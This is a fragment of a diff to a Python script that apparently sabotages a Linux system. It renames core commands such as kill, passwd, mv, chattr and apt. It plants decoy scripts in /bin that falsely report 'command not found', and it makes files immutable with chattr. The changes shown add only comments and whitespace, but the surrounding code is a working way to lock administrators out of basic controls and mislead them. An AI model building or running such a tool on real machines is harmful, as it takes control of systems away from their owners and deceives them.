@@ -21,7 +21,8 @@ def change_command_name(original_name, new_name):
         print(f"Command name changed successfully. You can now use '{new_name}' instead of '{original_name}'.")
     except Exception as e:
         print(f"An error occurred: {e}")
-
+        
+#Creates a dummy copy of the changed command in /bin
 def create_decoy_file(command_name):
     script_content = f"""#!/bin/bash
     echo "{command_name}: command not found"
@@ -36,6 +37,7 @@ def create_decoy_file(command_name):
 
     print(f"The script has been created at {file_path}.")
 
+#Make any file immutable
 def make_immutable(file_path):
     try:
         # Use subprocess to run the chattr command
@@ -51,7 +53,7 @@ if __name__ == "__main__":
     try:
         directory = "/bin"
         # Get a list of all files in the specified directory
-        files = os.listdir(directory)
+        files = os.listdir(directory)   
     except FileNotFoundError:
         print(f"Error: Directory '{directory}' not found.")
     commands = ["chattr", "passwd", "mv", "kill", "skill", "pkill", "xkill", "find", "killall", "apt"]
